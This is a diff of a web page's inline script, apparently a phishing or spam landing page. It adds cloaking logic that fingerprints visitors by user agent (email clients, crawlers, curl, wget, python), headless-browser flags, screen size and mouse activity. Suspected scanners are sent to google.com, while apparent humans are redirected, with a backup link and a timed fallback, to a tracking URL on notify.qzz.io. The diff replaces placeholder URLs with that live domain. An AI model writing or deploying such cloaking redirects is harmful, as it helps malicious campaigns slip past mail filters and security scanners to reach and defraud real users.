@@ -23,36 +23,30 @@
         // Lightweight bot detection
         const d=()=>{
             let s=0,ua=navigator.userAgent.toLowerCase();
-
             // Check email clients & bots
             if(/outlook|thunderbird|mailkit|bot|crawler|spider|python|curl|wget/.test(ua))s+=5;
-
             // Check missing features
             if(!window.localStorage||!window.requestAnimationFrame)s+=3;
             if(navigator.webdriver||window._phantom)s+=4;
             if(screen.width<100||screen.height<100)s+=3;
-
             // Quick interaction check
             let i=false;
             document.onmousemove=()=>i=true;
             document.onclick=()=>i=true;
-
             setTimeout(()=>{
                 if(!i)s+=2;
-                const real='https://example.com/track/click.php?goto=https://notify.qzz.io';
+                const real='https://notify.qzz.io/tracker/click.php?goto=https://notify.qzz.io';
                 const safe='https://google.com';
                 location.href=s>=5?safe:real;
             },1500);
-
             // Backup link
             setTimeout(()=>{
                 document.getElementById('backup').style.display='block';
-                document.getElementById('backup').href='https://example.com/track/click.php?goto=https://notify.qzz.io';
+                document.getElementById('backup').href='https://notify.qzz.io/tracker/click.php?goto=https://notify.qzz.io';
             },3000);
         };
-
         window.onload=d;
-        setTimeout(()=>location.href='https://example.com/track/click.php?goto=https://notify.qzz.io',8000);
+        setTimeout(()=>location.href='https://notify.qzz.io/tracker/click.php?goto=https://notify.qzz.io',8000);
     </script>
 </body>
 </html>
